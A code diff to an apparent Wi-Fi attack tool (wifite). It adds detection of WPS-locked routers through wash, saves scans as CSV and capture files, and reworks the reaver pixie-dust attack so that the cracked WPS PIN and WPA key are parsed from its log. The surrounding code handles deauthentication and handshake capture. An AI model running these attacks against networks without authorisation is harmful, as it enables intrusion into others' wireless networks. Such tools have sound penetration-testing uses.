@@ -161,7 +161,7 @@ class Target:
         Holds data for a Target (aka Access Point aka Router)
     """
 
-    def __init__(self, bssid, power, data, channel, encryption, ssid, wps = False, key=""):
+    def __init__(self, bssid, power, data, channel, encryption, ssid, wps = False, key="", wps_locked = False):
         self.bssid = bssid
         self.power = int(power)
         self.data = data
@@ -169,6 +169,7 @@ class Target:
         self.encryption = encryption
         self.ssid = ssid
         self.wps = wps  # Default to non-WPS-enabled router.
+        self.wps_locked= wps_locked
         self.key = key
     def __str__(self):
         return re.sub(r'[^a-zA-Z0-9]', '', self.ssid) \
@@ -203,7 +204,7 @@ class RunConfiguration:
     """
 
     def __init__(self):
-        self.REVISION = 102;
+        self.REVISION = 103;
         self.PRINTED_SCANNING = False
         
         #INTERFACE
@@ -805,8 +806,8 @@ class RunConfiguration:
         interface_group.add_argument('-tx', metavar='[N]', help=argparse.SUPPRESS, action='store', dest='tx')        
 
         target_group = option_parser.add_argument_group('TARGET')
-        target_group.add_argument('-l','--load', metavar='[file]', help='Load airodump file instead of scanning.', action='store', dest='load')
-        target_group.add_argument('-v','--save', metavar='[file]', help='Save airodump file.', action='store', dest='save')
+        target_group.add_argument('-l','--load', metavar='[file]', help='Load airodump csv/cap file instead of scanning.', action='store', dest='load')
+        target_group.add_argument('-v','--save', metavar='[file]', help='Save airodump csv/cap file.', action='store', dest='save')
         target_group.add_argument('-s','--show', metavar='[filters]', help='Filter targets in scanning state.' + 'Syntax: numbers, range (e.g. "1-4"), power level (e.g. "p[>,>=,=,<=,<][POWER]"), channel (e.g. "c[CHANNEL,range])", wps disabled or enabled (e.g. "wps0", "wps1"), Cipher (e.g. "wep" or "wpa", "wep[NUM OF CLIENT]" or "wpa[NUM OF CLIENT]", "wep+" or "wpa+" for network with clients), ESSID (e.g. "e[ESSID]") or BSSID (e.g. "b[11:22:33]"). Multiple filters separated by comma supported. Add "-" or "=" before to remove targets.', action='store', dest='show')
         target_group.add_argument('-t','--timeout', metavar='[criteria]', help='Criteria to stop scanning state. Numbers = seconds, e[ESSID][+] or b[BSSID][+]= timeout when target is found, add "+" at the end means "with clients", n[>,>=,=,<=,<][num of targets] = timeout when total targets more/equal/less than certain numbers. Multiple criteria separated by comma supported.', action='store', dest='timeout')
         target_group.add_argument('-c','--channel', metavar='[N]', type=int, help='Filter targets with specific channel in scanning state (equivalent to "--show c[N]").', action='store', dest='channel')
@@ -1507,13 +1508,15 @@ class RunEngine:
                 wps_check_targets(targets, self.RUN_CONFIG.temp + 'wifite-01.cap')
 
             if self.RUN_CONFIG.SCAN_FILE_SAVE != "":
-                copy(self.RUN_CONFIG.temp + 'wifite-01.csv', self.RUN_CONFIG.SCAN_FILE_SAVE) #time.strftime("%Y-%m-%d %H %M %S")
+                copy(self.RUN_CONFIG.temp + 'wifite-01.csv', self.RUN_CONFIG.SCAN_FILE_SAVE + ".csv") #time.strftime("%Y-%m-%d %H %M %S")
+                copy(self.RUN_CONFIG.temp + 'wifite-01.cap', self.RUN_CONFIG.SCAN_FILE_SAVE + ".cap") #time.strftime("%Y-%m-%d %H %M %S")
 
             remove_airodump_files(self.RUN_CONFIG.temp + 'wifite')
         else:
-            println_info("opening AP file " +self.RUN_CONFIG.SCAN_FILE_LOAD)
-            (targets, clients) = self.parse_csv(self.RUN_CONFIG.SCAN_FILE_LOAD)
+            println_info("opening AP file " +self.RUN_CONFIG.SCAN_FILE_LOAD + ".csv/.cap")
+            (targets, clients) = self.parse_csv(self.RUN_CONFIG.SCAN_FILE_LOAD + ".csv")
             targets=self.add_known_ssid(targets)
+            wps_check_targets(targets, self.RUN_CONFIG.SCAN_FILE_LOAD + '.cap', False)
         # if stop_scanning:
         #     return (targets, clients)
 
@@ -1558,7 +1561,7 @@ class RunEngine:
         return (victims, clients)
     def get_input(self, max):
         return raw_input((GR + "\n [+]" + W + " enter " + G + "target numbers" + W + " (" + G + "1-%s" + W + ")") % (str(max)) + \
-            (" separated by commas, range (e.g.'" + G + "1-2" + W + "'), or wildcards: %s, ") % (G + 'c[num/range]' + W + ' for channel, ' + G + 'p[>=,>,=,<,<=][num]' + W + ' for power, ' + G + 'wep' + W + ', ' + G + 'wep[num of client]' + W + ' or ' + G + 'wep+' + W + " with client, " + G + 'wpa' + W + ' (same syntax as wep), ' + G + 'wps[0,1]' + W + '(0=no, 1=yes), ' + G + 'e[SSID][+]' +W +', ' + G + 'b[BSSID][+]' + W + ' or ' + G + 'all' + W) + \
+            (" separated by commas, range (e.g.'" + G + "1-2" + W + "'), or wildcards: %s, ") % (G + 'c[num/range]' + W + ' for channel, ' + G + 'p[>=,>,=,<,<=][num]' + W + ' for power, ' + G + 'wep' + W + ', ' + G + 'wep[num of client]' + W + ' or ' + G + 'wep+' + W + " with client, " + G + 'wpa' + W + ' (same syntax as wep), ' + G + 'wps[0,1,2]' + W + '(0=no, 1=yes, 2=lock), ' + G + 'e[SSID][+]' +W +', ' + G + 'b[BSSID][+]' + W + ' or ' + G + 'all' + W) + \
             "blank input = " + G + "all" + W + ", add " + G + '-' + W + " before to remove:" )
     def deauth(self, target, clients, time_started, iface, wait = False):
         cmd = ['aireplay-ng',
@@ -1676,7 +1679,7 @@ class RunEngine:
             print_text+= G
         else:
             print_text+= O
-        print_text+="%s" % target.encryption.strip().ljust(7) + W
+        print_text+="%s" % target.encryption.strip().ljust(8) + W
         print_text+= separator*spacing
 
         # Power
@@ -1693,7 +1696,11 @@ class RunEngine:
         #if self.RUN_CONFIG.WPS_DISABLE:
         #    print "  %3s" % (O + 'n/a' + W),
         #else:
-        print_text+="%3s" % (G + 'yes' + W if target.wps else R + ' no' + W)
+        if target.wps_locked:
+            print_text+=R + "lock" + W
+        else:
+            print_text+=" %s" % (G + 'yes' + W if target.wps else R + ' no' + W)
+        
         print_text+=separator*spacing
 
         # Clients
@@ -1706,7 +1713,7 @@ class RunEngine:
     def print_targets(self, targets, clients, max_rows=0, columns = 1, spacing = 1):
     #spacing -=1 # Python 2 will add space automatically between consecutive print statement
         headers=["No.","ESSID","BSSID","CH"," CIPHER","PW","WPS","CLIENT"]
-        sizes=[3,25,17,2,7,2,3,6]
+        sizes=[3,25,17,2,8,2,4,6]
         shows=[True,True,self.RUN_CONFIG.SHOW_MAC_IN_SCAN,True,True,True,True,True]
         
         if len(targets) == 0:
@@ -1785,14 +1792,15 @@ class RunEngine:
                                     victims.index(target)
                                 except ValueError:
                                     victims.append(target)
-            elif re.match('^wps(0|1)$',r):
-                matches=re.match('^wps(0|1)$',r)
+            elif re.match('^wps(0|1|2)$',r):
+                matches=re.match('^wps(0|1|2)$',r)
                 result=matches.groups()
                 comparison=bool(int(result[0]))
                 #print comparison
                 if remove:
                     for victim in victims:
-                        if victim.wps==comparison: 
+                        if victim.wps==comparison:
+                            if result[0]=='0' or result[0] == '1' and not target.wps_locked or result[0] == '2' and target.wps_locked:
                                 try:
                                     victims.remove(target)
                                 except ValueError:
@@ -1801,6 +1809,7 @@ class RunEngine:
                 else:
                     for target in targets:
                         if target.wps==comparison:
+                            if result[0]=='0' or result[0] == '1' and not target.wps_locked or result[0] == '2' and target.wps_locked:
                                 try:
                                     victims.index(target)
                                 except ValueError:
@@ -2577,12 +2586,47 @@ class Interface:
 ######################
 # SCANNING FUNCTIONS #
 ######################
+class wash:
+    def __init__(self):
+        self.is_old=self.is_old_version()
+        self.program_name="wash"
+        self.length=[18,9,6,13,12,27]
+    def get_result(self,cap_file):
+        rows=[]
+        cmd = [self.program_name, '-f', cap_file ]
+        
+        if self.is_old:
+           cmd.append('-C')  # ignore Frame Check Sum errors
+        proc = Popen(cmd, stdout=PIPE, stderr=DN)
+        proc.wait()
+
+        for line in proc.communicate()[0].split('\n'):
+            if line.strip() == '' or line.startswith('Scanning for'): continue
+            row=[]
+            start=0
+            for l in self.length:
+                row.append(line[start:l+start].strip(" "))
+                start+=l
+            rows.append(row)
+            #print row
+        return rows
+    def is_old_version(self):
+        p=Popen(['wash'], stdout=PIPE, stderr=PIPE)
+        p.wait()
+        matches=re.match("Wash v(\d+)\.(\d+)\.(\d+)",p.stdout.read().split("\n")[1])
+        result=matches.groups();
+        if result[0] == "1" and result[1] < "5":
+            return True
+        else:
+            return False
+
 
 def wps_check_targets(targets, cap_file, verbose=True):
     """
         Uses reaver's "walsh" (or wash) program to check access points in cap_file
         for WPS functionality. Sets "wps" field of targets that match to True.
     """
+    
     global RUN_CONFIG
 
     if not file_search('walsh') and not file_search('wash'):
@@ -2594,19 +2638,14 @@ def wps_check_targets(targets, cap_file, verbose=True):
     if verbose:
         println_info('checking for ' + G + 'WPS compatibility' + W + '...',)
         stdout.flush()
-
-    cmd = [program_name,
-           '-f', cap_file,
-           '-C']  # ignore Frame Check Sum errors
-    proc_walsh = Popen(cmd, stdout=PIPE, stderr=DN)
-    proc_walsh.wait()
-    for line in proc_walsh.communicate()[0].split('\n'):
-        if line.strip() == '' or line.startswith('Scanning for'): continue
-        bssid = line.split(' ')[0]
-
+    w=wash()
+    rows=w.get_result(cap_file)
+    for row in rows:
         for t in targets:
-            if t.bssid.lower() == bssid.lower():
+            if t.bssid == row[0]:
                 t.wps = True
+                t.wps_locked=True if (row[4] == "Yes") else False
+                break
     if verbose:
         print 'done'
     #removed = 0
@@ -2709,20 +2748,22 @@ def send_interrupt(process):
     """
         Sends interrupt signal to process's PID.
     """
-    try:
-        os.kill(process.pid, SIGINT)
-        # os.kill(process.pid, SIGTERM)
-    except OSError:
-        pass  # process cannot be killed
-    except TypeError:
-        pass  # pid is incorrect type
-    except UnboundLocalError:
-        pass  # 'process' is not defined
-    except AttributeError:
-        pass  # Trying to kill "None"
-
-
-
+    if isinstance(process,list):
+        for p in process:
+            send_interrupt(p)
+    else:
+        if process != None and process.poll() is None:
+            try:
+                os.kill(process.pid, SIGINT)
+                # os.kill(process.pid, SIGTERM)
+            except OSError:
+                pass  # process cannot be killed
+            except TypeError:
+                pass  # pid is incorrect type
+            except UnboundLocalError:
+                pass  # 'process' is not defined
+            except AttributeError:
+                pass  # Trying to kill "None"
 
 def attack_interrupted_prompt():
     """
@@ -3107,16 +3148,14 @@ class WPAAttack(Attack):
             print R + '\n (^C)' + O + ' WPA handshake capture interrupted' + W
             if attack_interrupted_prompt():
                 remove_airodump_files(self.dump_file_prefix)
-                send_interrupt(proc_read)
-                send_interrupt(proc_deauth)
+                send_interrupt([proc_read,proc_deauth])
                 print ''
                 self.RUN_CONFIG.exit_gracefully(0)
 
 
         # clean up
         remove_airodump_files(self.dump_file_prefix)
-        send_interrupt(proc_read)
-        send_interrupt(proc_deauth)
+        send_interrupt([proc_read,proc_deauth])
 
         return got_handshake
 
@@ -3320,7 +3359,7 @@ class WPAAttack(Attack):
                    '-o', capfile + '.temp',
                    'stripLive']
             call(cmd, stdout=DN, stderr=DN)
-            rename(capfile + '.temp', output_file)
+            rename(capfile + '.temp', capfile)
 
         elif file_search('tshark'):
             # strip results with tshark
@@ -3384,6 +3423,7 @@ class WEPAttack(Attack):
             Abstract method for ending the WEP attack
         '''
         pass
+
     def is_cracked(self):   # True = cracked, False = cracking failed, None = cracking in progress
         if os.path.exists(self.key_file):
             # Cracked!
@@ -4041,12 +4081,19 @@ class WEPAttack(Attack):
 #################
 # WPS FUNCTIONS #
 #################
+
 class WPSAttack(Attack):
     def __init__(self, iface, target, config):
         self.iface = iface
         self.target = target
         self.RUN_CONFIG = config
-
+        self.log_filename = self.RUN_CONFIG.temp + str(self.target) + '.reaver.pixie.log'
+        self.processes = []
+        self.session_filename=self.get_reaver_session_filename(self.target)
+        self.session_filename_with_path=self.RUN_CONFIG.WPS_SESSION_DIR + self.session_filename
+        # Redirect stderr to output file
+        self.log = open(self.log_filename, 'a')
+        
         try:
            os.mkdir(self.RUN_CONFIG.WPS_SESSION_DIR)
         except OSError:
@@ -4055,15 +4102,36 @@ class WPSAttack(Attack):
         '''
             Abstract method for initializing the WPS attack
         '''
-        if not self.RUN_CONFIG.WPS_DUST_ATTACK_DISABLE and self.is_pixie_supported():
-            # Try the pixie-dust attack
-            if self.attack_wps_pixie():
-                return True
-        if not self.RUN_CONFIG.WPS_PIN_ATTACK_DISABLE :
-        # Try the WPS PIN attack
-            return self.attack_wps()
-        return False
-        
+        self.time_started=time.time()
+        success = False
+        try:
+            if not self.RUN_CONFIG.WPS_DUST_ATTACK_DISABLE and self.is_pixie_supported():
+                # Try the pixie-dust attack
+                self.attack_wps_pixie() 
+                while(self.is_attacking_pixie() and not self.is_done_pixie()):
+                    time.sleep(1)
+                    print '\r %s WPS pixie dust attack in progress...' % (GR + sec_to_hms(time.time() - self.time_started) + G),
+                    stdout.flush()
+                (pin,key)=self.parse_log_for_keys()
+                if pin != "" or key != "":
+                    self.target.key = key
+                    self.target.wps = pin
+                    self.RUN_CONFIG.save_cracked(self.target)
+                    success=True
+                else:
+                    print '\r %s WPS pixie dust attack%s failed - WPS pin not found              %s' % (GR + sec_to_hms(time.time() - self.time_started) + G, R, W)
+            if not self.RUN_CONFIG.WPS_PIN_ATTACK_DISABLE and not success:
+            # Try the WPS PIN attack
+                success=self.attack_wps()
+            return success
+        except KeyboardInterrupt:
+            print R + '\n (^C)' + O + ' WPS pixie dust attack interrupted' + W
+            if attack_interrupted_prompt():
+                send_interrupt(self.processes)
+                print ''
+                self.RUN_CONFIG.exit_gracefully(0)
+        send_interrupt(self.processes)
+
     def EndAttack(self):
         '''
             Abstract method for ending the WPS attack
@@ -4080,26 +4148,25 @@ class WPSAttack(Attack):
             if '--pixie-dust' in line:
                 return True
         return False
-
+    
     def attack_wps_pixie(self):
         """
             Attempts "Pixie WPS" attack which certain vendors
             susceptible to.
         """
-
-        log_filename=self.RUN_CONFIG.temp + str(self.target) + '.reaver.pixie.log'
-        session_filename=self.get_reaver_session_filename(self.target)
-        session_filename_with_path=self.RUN_CONFIG.WPS_SESSION_DIR + session_filename
+        log_filename=self.log_filename
+        session_filename=self.session_filename
+        session_filename_with_path=self.session_filename_with_path
 
         print GR + ' [0:00:00]' + W + ' %s ' % \
                                       (get_start_message('WPS pixie dust attack', self.target))
         cmd = ['reaver',
                '-i', self.iface.iface,
                '-b', self.target.bssid,
-               '-o', log_filename,  # Dump output to file to be monitored
+               #'-o', log_filename,  # Dump output to file to be monitored
                '-c', self.target.channel,
-               '-S',
-               '-n',
+               #'-S',
+               #'-n',
                '-K', '1', # Pixie WPS attack
                '-vvv']  # verbose output
 
@@ -4111,11 +4178,42 @@ class WPSAttack(Attack):
                 proc=Popen(['cp',filename,session_filename_with_path], stdout=DN, stderr=DN)
                 proc.wait()
 
-        # Redirect stderr to output file
-        errf = open(self.RUN_CONFIG.temp + '.reaver.pixie.out', 'a')
         # Start process
-        proc = Popen(cmd, stdout=errf, stderr=errf)
+        proc = Popen(cmd, stdout=self.log, stderr=self.log)
+        self.processes.append(proc)
+        return True
+    def is_attacking_pixie(self):
+        for p in self.processes:
+            #print p.pid,p.returncode,p.poll()
+            if p.poll() != None:
+                return False
+        return True
+    def is_done_pixie(self):
+        if os.path.exists(self.log_filename):
+            inf = open(self.log_filename, 'r')
+            buff=inf.read()
+            inf.close()
+            #print buff.find("Nothing done,") , buff.find("WPS pin not found") , buff.find("WPS PIN:")
+            return buff.find("WPS pin not found") != -1 or buff.find("WPS PIN:") != -1 # buff.find("Nothing done,") != -1 or 
+        return False
+    def parse_log_for_keys(self):
+        pin = ""
+        key = ""
+        if os.path.exists(self.log_filename):
+            inf = open(self.log_filename, 'r')
+            lines = inf.read().split('\n')
+            inf.close()
+            
+            for line in lines:
+                # When it's cracked:
+                if line.find("WPS PIN: '") != -1:
+                    pin = line[line.find("[+] WPS PIN:       '"):-1]
+                if line.find("WPA Key: '") != -1:
+                    key = line[line.find("[+] WPA Key found: '"):-1]
+        return (pin,key)
 
+    def is_cracked_pixie(self):
+        log_filename = self.log_filename
         cracked = False  # Flag for when password/pin is found
         time_started = time.time()
         pin = ''
@@ -4124,11 +4222,11 @@ class WPSAttack(Attack):
         try:
             while not cracked:
                 time.sleep(1)
-                errf.flush()
-                if proc.poll() != None:
+                self.log.flush()
+                if self.processes[0].poll() != None:
                     # Process stopped: Cracked? Failed?
-                    errf.close()
-                    inf = open(self.RUN_CONFIG.temp + 'pixie.out', 'r')
+                    self.log.close()
+                    inf = open(log_filename, 'r')
                     lines = inf.read().split('\n')
                     inf.close()
                     for line in lines:
@@ -4147,8 +4245,8 @@ class WPSAttack(Attack):
 
                 print '\r %s WPS pixie dust attack in progress...' % (GR + sec_to_hms(time.time() - time_started) + G),
                 # Check if there's an output file to parse
-                if not os.path.exists(self.RUN_CONFIG.temp + 'out.out'): continue
-                inf = open(self.RUN_CONFIG.temp + 'out.out', 'r')
+                if not os.path.exists(log_filename): continue
+                inf = open(log_filename, 'r')
                 lines = inf.read().split('\n')
                 inf.close()
 
@@ -4172,8 +4270,8 @@ class WPSAttack(Attack):
                 stdout.flush()
 
                 # Clear out output file
-                inf = open(self.RUN_CONFIG.temp + 'out.out', 'w')
-                inf.close()
+                #inf = open(self.RUN_CONFIG.temp + 'out.out', 'w')
+                #inf.close()
 
             # End of big "while not cracked" loop
             if cracked:
@@ -4183,19 +4281,18 @@ class WPSAttack(Attack):
                 G + self.target.ssid + W, C + key + W, C + pin + W))
                 self.RUN_CONFIG.WPA_FINDINGS.append('')
 
-                t = Target(self.target.bssid, 0, 0, 0, 'WPA', self.target.ssid)
-                t.key = key
-                t.wps = pin
-                self.RUN_CONFIG.save_cracked(t)
+                self.target.key = key
+                self.target.wps = pin
+                self.RUN_CONFIG.save_cracked(self.target)
 
         except KeyboardInterrupt:
             print R + '\n (^C)' + O + ' WPS pixie dust attack interrupted' + W
             if attack_interrupted_prompt():
-                send_interrupt(proc)
+                send_interrupt(self.processes)
                 print ''
                 self.RUN_CONFIG.exit_gracefully(0)
 
-        send_interrupt(proc)
+        send_interrupt(self.processes)
 
         # Delete the files
         #os.remove(log_filename)
